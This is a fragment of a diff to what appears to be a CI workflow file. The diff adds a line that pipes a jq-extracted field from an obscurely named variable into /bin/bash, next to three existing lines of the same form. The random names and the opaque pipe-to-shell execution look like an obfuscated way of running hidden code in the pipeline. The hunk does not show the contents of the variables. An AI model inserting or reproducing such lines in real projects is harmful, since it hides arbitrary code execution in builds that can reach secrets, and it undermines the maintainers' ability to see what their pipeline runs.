@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$iqfr2347" | jq -r .unl6 | /bin/bash
           echo $ph9065 | jq -r .rsao196 | /bin/bash
           echo $iohs375 | jq -r .lxrs087 | /bin/bash
+          echo $f3849 | jq -r .qm280 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
